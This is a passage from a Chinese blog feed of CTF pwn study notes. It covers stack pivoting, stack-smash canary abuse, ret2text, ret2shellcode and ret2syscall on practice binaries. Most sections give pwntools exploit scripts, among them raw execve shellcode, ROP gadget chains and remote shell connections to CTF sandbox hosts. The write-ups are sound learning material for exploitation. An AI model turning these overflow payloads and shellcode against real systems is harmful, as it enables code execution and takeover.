src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-26-26.png"></p><p>其中在第二个输入溢出时，只有<code>(0x38-0x28-4)</code>即12个字节的缓冲区可以利用，无法直接在栈上构造rop链。题目也有提示，我们需要将rop链存到buf中，再将栈转移到buf上。</p><p>我们发现puts一条文本<code>Call ret2win() from libpivot</code>，没有在这个可执行文件中发现这个函数，但是题目还给了一个动态链接库 <code>libpivot32.so</code>，发现这是一个后门函数，我们可以控制程序跳转到这里执行为我们打开flag。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-33-31.png"></p><p>需要注意的是程序执行到我们填入的<code>leave;ret</code>指令之前，自己也执行了一次该指令。也就是说这个指令被执行了两次</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-04_15-45-03.png"></p><p>由于每次ret都会使得esp+4，所以，伪造的ebp的地址要减去4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./pivot32&quot;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pivot32&#x27;</span>)<br>lib_elf=ELF(<span class="hljs-string">&#x27;./libpivot32.so&#x27;</span>)<br><br>func_plt=elf.plt[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>func_got_plt=elf.got[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>foothold_sym=lib_elf.symbols[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>ret2win_sym=lib_elf.symbols[<span class="hljs-string">&#x27;ret2win&#x27;</span>]<br>offset=<span class="hljs-built_in">int</span>(ret2win_sym-foothold_sym)<br><br>leave_ret=<span class="hljs-number">0x080486a8</span><br>mov_eax_eax=<span class="hljs-number">0x080488c4</span><br>pop_eax=<span class="hljs-number">0x080488c0</span><br>pop_ebx=<span class="hljs-number">0x08048571</span><br>add_eax_ebx=<span class="hljs-number">0x080488c7</span><br>call_eax=<span class="hljs-number">0x080486a3</span><br><br>p.recvuntil(<span class="hljs-string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)<br>fake_ebp=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><br>payload1=p32(func_plt)+p32(pop_eax)+p32(func_got_plt)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)<br><br><span class="hljs-comment">#这里需要先调用一次foothold_function，将它的地址加载到got.plt中，我们才能进行后续的替换</span><br><span class="hljs-comment">#payload含义为，将eax赋值为foothold_function的真实地址，再将ebx赋值为foothold_function和ret2win的偏移，最后将ebx加到eax上，调用ret2win</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload1)<br><br>payload2=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>+p32(fake_ebp-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p> [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) </p><p>题目拿到手先查看一下基本信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-27-21.png"></p><p>查看一下源码发现vul函数有栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-39-53.png"></p><p>但是可控制的范围很小只有50-32-4&#x3D;14个字节，我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。</p><p>构造完shellcode之后，我们需要对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>查找一下可以利用的gadget</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-46-47.png"></p><p>其中<code>0x08048504</code>有直接跳转到esp的片段，</p><p>修改栈上的返回地址为<code>jmp esp</code>的地址，这样程序就会跳转到栈顶指针所指向的地址处执行payload。</p><p>构造结构如下：</p><p>shellcode+padding&#x3D;0x20，fake ebp&#x3D;0x4，jmp_esp&#x3D;0x4</p><p>为了保证栈上有足够的空间执行payload，我们能将栈指针向下调整，即sub esp, 0x28;jmp esp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./b0verfl0w&#x27;</span>)<br><br>jum_esp=<span class="hljs-number">0x08048504</span><br><br>Shellcode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br>Payload=Shellcode+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(jum_esp)+asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br><span class="hljs-comment">#先利用sub esp, 0x28;jmp esp指令跳转到调整后的栈顶，再向上面写入shellcode，最后再次执行jum_esp跳转执行shellcode  </span><br><br>r.sendline(Payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><p>canary保护有多种绕过方式，其中Stack smash就是绕过canary保护的一种方式。之前做过的canary保护绕过是填充canary最后的字节并之后暴力枚举或是直接泄露，从而避免canary保护程序报错。Stack smash这个方法并不在乎是否会引发canary报错，而是利用报错的内容。</p><p>在程序启动canary保护之后，如果发现canary被修改的话就会执行 <code>_stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下这个指针指向程序名。如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串地址，那么在 <code>_fortify_fail</code> 函数中就会输出我们想要的信息。</p><blockquote><p>这个方法适用于glibc-2.31以前的程序，之后的程序不会打印 argv[0] 指针所指向的字符串</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>以2015年32C3 CTF readme 为例</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">2015 32C3 CTF readme</a></p><p>触发canary保护后程序会输出一段报错  </p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_16-51-08.png"></p><p>开始解题，反汇编一下源码。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-14-00.png"></p><p>程序中有两次输入，第一次输入赋值给v3后不对其进行任何操作；第二次输入赋值给v1，将其不断赋值给byte_600D20这个数组。</p><p>双击查看数组</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-16-59.png"></p><p>也就是说这道题我们只需要拿flag而不是拿shell，而且v2变量接收第二次输入的字符串，并且会不断覆盖原有的flag内容。</p><p>在这之后还有一条语句</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)v0 + <span class="hljs-number">6294816LL</span>), <span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">32</span> - v0));<br></code></pre></td></tr></table></figure><p> 这条伪代码的原型是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">int</span> value, <span class="hljs-type">size_t</span> num)</span></span>;<br></code></pre></td></tr></table></figure><p>意思是从内存指针ptr指向的位置直到向后num字节都被value取代。</p><p>结合 <code>byte_600D20[v0++] = v1;</code> ，我们题目中的函数意思就是无论你是否进行第二次输入，在程序结束后 flag 的位置都将被替换，我们就无法通过直接修改 argv[0] 的值获得 flag 。</p><p>但是flag被映射了两次，0x600D21中的flag被修改，那我们就把 argv[0] 指向 0x400d21。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_16-02-26.png"></p><blockquote><p>看了很多大佬的解析也没搞明白，程序中有两个load段，为什么第二个load段中的flag，会被映射到第一个load 段里🥲</p></blockquote><p>查找argv[0]的位置，一共找到三种方法：</p><ul><li>方法一：</li></ul><p>用peda挂载文件，先在第一个gets处下断点</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-37-25.png"></p><p>利用find命令查找与文件名有关的地址，再计算当前的rsp指针与其的距离</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-42-28.png"></p><ul><li>方法二</li></ul><p>也是利用argv[0]指向程序名的特点寻找，直接下断点，查找指向程序名的内存指针。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-46-20.png"></p><ul><li>方法三</li></ul><p>用命令<code>p &amp; __libc_argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gdb">&gt; p &amp; __libc_argv[0]<br>$1 = (char **) 0x7fffffffdff8<br></code></pre></td></tr></table></figure><p>我们要写入536个字节也就是0x218个字节才能将argv[0]覆盖掉，所以payload构成应该是0x218字节的填充物加上我们目标flag的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Please overwrite the flag:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;Modifier&#x27;</span>)<br><br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>但是没有输出，是因为程序把错误信号发送给了执行程序的终端里，我们需要修改环境变量让错误信息通过网络传到我们的终端里。</p><p>所以我们要利用第二次的输入，将 <code>LIBC_FATAL_STDERR_=1</code> 写入到环境变量中。在第一个payload当中我们已经把指针指向了argv[0]，需要将指针再次指向第二次输入点，结果如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)</span><br><br><span class="hljs-variable">payload_1</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x218</span> + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400d20</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x600d20</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_1</span>)<br><br><span class="hljs-variable">payload_2</span> = <span class="hljs-string">&quot;LIBC_FATAL_STDERR_=1&quot;</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_2</span>)<br><br><span class="hljs-variable">print</span> <span class="hljs-variable">p.recvall</span>()<br></code></pre></td></tr></table></figure><hr><p>原来栈溢出不是想象中的辣么简单捏</p><p>栈上的东西终于整理好噜😊</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>真的很菜菜的ROP</title>
    <link href="/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的简单小玩意们</p><span id="more"></span><hr><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming，面向返回编程），其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>实施ROP的条件</strong></p><ul><li>程序存在栈溢出，且可以控制返回地址</li><li>可以找到满足程序的 gadgets 以及相应的 gadgets 的地址</li></ul><blockquote><p>都是copy来的）看到有的人说这个叫“面向返回地址”编程哈哈。</p></blockquote><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码(.text)，比如<code>system(&quot;/bin/sh&quot;)</code>或者<code>system(&quot;cat flag&quot;)</code>。我们需要做的就是把这些代码段的调用地址覆盖到返回地址上。</p><p>我们在控制程序执行的时候也可以控制程序执行好几段不相邻的已有代码，这是我们需要知道对应返回的代码的位置。程序如果开启了某些保护，我们就需要想办法去绕过它。</p><h4 id="🌰-1"><a href="#🌰-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png"></p><p>使用ida反编译main函数，发现gets()语句，可以利用栈溢出</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png"></p><p>而后我们在secure中可以找到调用<code>system(&#39;&quot;/bin/sh&quot;)</code>的代码，如果我们控制程序返回到这个指令，就可以获得系统的shell</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png"></p><p>查看代码地址为0x0804863A，接下来构造playload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>来自CTFHUB的ret2text ，我不知道怎么复制题目链接，自己点进去找叭<a href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p><p>查看文件信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png"></p><p>拖进32位IDA反编译发现main函数存在gets栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png"></p><p>shift+F12打开字符串窗口发现&#x2F;bin&#x2F;sh语句</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png"></p><p>去到对应的语句部分可以发现该程序将&#x2F;bin&#x2F;sh放到了rdi后，并且调用了sysytem</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png"></p><blockquote><p>64位系统中rdi，rsi，rdx，rcx，r8，r9作为调用函数的前6个参数，如果参数多于6个，其余参数放入栈中。与此对比，32位系统中由于寄存器有限，调用函数时参数都放入栈中</p></blockquote><p>找一个变量双击可以看到各个变量对应的虚拟内存地址，构造playload就可以先用0x70个自节填满s变量，再用8个字节填满r，最后加上&#x2F;bin&#x2F;sh的地址。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>‘+4’ 是因为32位程序要覆盖的ebp是四个字节，64位程序需要覆盖八字节的rbp</p></blockquote><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>就是篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址。我们可以利用pwntools中的shellcraft.sh()编写shellcode。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h4 id="🌰-1-1"><a href="#🌰-1-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载题目: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png"></p><p>进入main函数反编译一下：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png"></p><p>发现gets和strncpy存在栈溢出漏洞，但系统没有现成的‘bin&#x2F;sh’指令给我们用。我们要自己写🥲</p><p>那怎么写呢？这时就要请出我们的得力助手pwntools，在pwntools下可以自动生成shellcode脚本。</p><p>gets获得输入的s变量，并将其复制到buf2处。双击buf2可以跳转到其所在位置，我们发现buf2在.bss段，所在段地址为0x0804a080</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png"></p><p>调试下程序，看看这一个 bss 段是否可执行，显示rwxp就是可以。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png"></p><p>有权限就意味着我们可以将shellcode通过strncpy函数放进buf2这个区域，在触发溢出后将返回地址指向buf2这里即可拿到shell。</p><p>确定要覆盖的 return address 的偏移量相对于栈顶为 112 个字节。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-1"><a href="#🌰-2-1" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>还是CTFHub的题目。放进ubuntu查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png"></p><p>NX disabledz，即将shellcode放在数据段，即可执行</p><p>出现了一个新的变量RWX！</p><p>用IDA反编译题目main函数发现栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png"></p><p>我们可以知道buf相对于ebp的偏移量是0x10，所以我们需要填充(0x10+8)的数据。</p><p>双击buf查看程序中的变量信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png"></p><p>r即为返回地址，有0x8的偏移量，所以总共需要填充的数据长度是 (0x10+0x8+0x8)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure><blockquote><p>这也太深奥了没搞懂，有缘再说</p></blockquote><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall即控制程序执行系统调用，从而获取shell。前提是程序需要有int 0x80这样的系统调用的gadget.</p><p>在ret2shellcode的情境下，如果开启了NX，那我们写到栈中的shellcode就会被CPU报错而不可执行。这种情况下，我们可以尝试使用ret2syscall的方法。</p><p>ret2syscall就是指通过手机带有ret指令的指令片段拼接成我们需要的shellcode。</p><blockquote><p>ret 指令可以理解为取栈顶的数据作为下次跳转的位置，即 eip&#x3D;[esp]  esp&#x3D;[esp+4]</p><p>或者理解为 pop eip，jmp   </p><p>取栈顶数据作为下次跳转的位置，然后跳转;</p><p>同理call也可以理解为 push rip, jmp  </p><p>将call指令的下一条指令地址压入栈，然后跳转</p></blockquote><h4 id="🌰"><a href="#🌰" class="headerlink" title="🌰:"></a>🌰:</h4><p> bamboofox 中的 ret2syscall </p><p>首先检测程序开启的保护：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png"></p><p>查看其源码寻找利用点：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png"></p><p>main 函数里有 gets 可以实现栈溢出，计算偏移量为112。</p><p>接下来进行系统调用构造，利用ROPgadget查找对应的gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png"></p><p>选择0x080bb196的这段</p><p>同样，找到其他的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png"></p><p>这里可以同时控制三个寄存器，我们选它</p><p>选好所有的gadgets就拼接起来构造payload就好喽</p><figure class="highlight 